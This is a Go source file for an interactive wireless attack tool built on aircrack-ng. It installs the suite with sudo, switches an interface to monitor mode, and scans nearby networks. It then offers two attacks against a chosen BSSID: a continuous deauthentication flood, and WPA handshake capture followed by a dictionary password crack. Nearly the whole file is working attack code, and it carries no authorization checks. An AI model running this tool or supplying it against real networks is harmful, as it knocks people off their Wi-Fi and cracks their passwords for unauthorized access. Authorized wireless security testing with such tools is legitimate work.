package main

import (
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"time"
)

var cmd *exec.Cmd
var nic string
var bssid string
var channel string
var err error

func cleanup() {
	fmt.Println("Cleaning up old files...")
	err = os.RemoveAll("working_dir")
	errCheck(err)
	err = os.MkdirAll("working_dir", 0755)
	errCheck(err)

	cmd = exec.Command("clear")
	err = cmd.Run()
	errCheck(err)
}

func interrupt() chan bool {
	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)
	done := make(chan bool, 1)

	go func() {
		sig := <-sigs
		fmt.Println()
		fmt.Println("Received signal:", sig)
		done <- true
	}()
	return done

}

func checkPackages() {
	fmt.Println("Checking if aircrack is installed...")
	_, err := exec.Command("aircrack-ng", "--help").Output()

	if err != nil {
		fmt.Println("Error: ", err)
		fmt.Println("Aicrack-ng not found, installing...")

		osInfoFile, err := os.ReadFile("/etc/os-release")
		osinfo := string(osInfoFile)

		errCheck(err)

		switch {
		case strings.Contains(osinfo, "ID=ubuntu") || strings.Contains(osinfo, "ID=debian"):
			fmt.Printf("\nInstalling aircrack-ng using apt, press Ctrl + C if you want to install using a different package manager...")
			cmd = exec.Command("sudo", "apt", "install", "-y", "aircrack-ng")
			err = cmd.Run()
			errCheck(err)

		case strings.Contains(osinfo, "ID=manjaro") || strings.Contains(osinfo, "ID=arch"):
			fmt.Printf("Installing aircrack-ng using pacman, press Ctrl + C if you want to install using a different package manager...\n")
			time.Sleep(3 * time.Second)
			cmd = exec.Command("sudo", "pacman", "-S", "aircrack-ng", "--noconfirm")
			err = cmd.Run()
			errCheck(err)

		default:
			fmt.Println("No package managers found, install aircrack-ng yourself and run the script again")
			os.Exit(-2)
		}

		fmt.Println("Aircrack-ng installed successfully")
		time.Sleep(1 * time.Second)
	}
	fmt.Println("Aircrack-ng available")
	time.Sleep(1 * time.Second)

}

func startMonitor() {

	fmt.Println("Enter which network interface you want to use: ")
	time.Sleep(1 * time.Second)
	cmd = exec.Command("ip", "-o", "link", "show")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err = cmd.Run()
	errCheck(err)

	fmt.Scanln(&nic)

	cmd = exec.Command("clear")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err = cmd.Run()

	fmt.Printf("Starting Monitor Mode using %s...\n", nic)

	if !strings.Contains(nic, "mon") {
		cmd = exec.Command("sudo", "airmon-ng", "start", nic)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		err = cmd.Run()
		errCheck(err)
		nic = nic + "mon"
	}

	time.Sleep(2 * time.Second)
	cmd = exec.Command("clear")

	cmd = exec.Command("sudo", "airodump-ng", "-w", "./working_dir/dump", "--output-format", "csv", nic, "-b", "abg")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err = cmd.Start()
	errCheck(err)

	<-interrupt()
	fmt.Println("Exiting airodump-ng...")
	cmd.Wait()
	cmd.Process.Kill()

	fmt.Println("Enter BSSID of the network: ")
	fmt.Scanln(&bssid)
	fmt.Println("Enter channel: ")
	fmt.Scanln(&channel)

	cmd = exec.Command("sudo", "airodump-ng", "-w", "./working_dir/dump-network", "--output-format", "csv", "--bssid", bssid, "--channel", channel, "-b", "abg", nic)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err = cmd.Start()
	errCheck(err)

	<-interrupt()
	fmt.Println("Exiting airodump-ng...")
	cmd.Wait()
	cmd.Process.Kill()
}

func deauth() {
	cmd = exec.Command("sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, nic)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err = cmd.Start()
	errCheck(err)

	<-interrupt()
	fmt.Println("Exiting...")
	cmd.Wait()
	cmd.Process.Kill()
}

func cap() {
	var wordlist string

	cmd = exec.Command("sudo", "airodump-ng", "-w", "./working_dir/handshake", "--bssid", bssid, "-c", channel, nic)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err = cmd.Start()
	errCheck(err)

	<-interrupt()
	cmd.Wait()

	fmt.Println("Choose a wordlist to run dictionary attack:")
	fmt.Scanln(&wordlist)
	fmt.Println("Press Ctrl + C to stop or exit after password is found...")
	time.Sleep(2 * time.Second)

	cmd = exec.Command("sudo", "aircrack-ng", "-w", wordlist, "-b", bssid, "./working_dir/handshake-01.cap")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err = cmd.Start()
	errCheck(err)

	<-interrupt()
	cmd.Wait()
	fmt.Println("Exiting...")
	cmd.Process.Kill()
}

func errCheck(err error) {
	if err != nil {
		fmt.Println("Error: ", err)
		os.Exit(-1)
	}
}

func main() {
	ch := -1
	cleanup()
	checkPackages()
	startMonitor()

	for ch != 0 {
		fmt.Println("What attack do you want to perform?")
		fmt.Println("1. Deauth")
		fmt.Println("2. Handshake Capture + Password Crack")
		fmt.Println("0. Exit")
		fmt.Scanln(&ch)

		switch ch {
		case 0:
			fmt.Println("Turning off monitor mode and exiting...")
			cmd = exec.Command("sudo", "airmon-ng", "stop", nic)
			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr
			err = cmd.Run()
			errCheck(err)
			os.Exit(0)

		case 1:
			deauth()
		case 2:
			cap()
		default:
			fmt.Println("Enter a valid choice:")
		}
	}

	os.Exit(1)
}
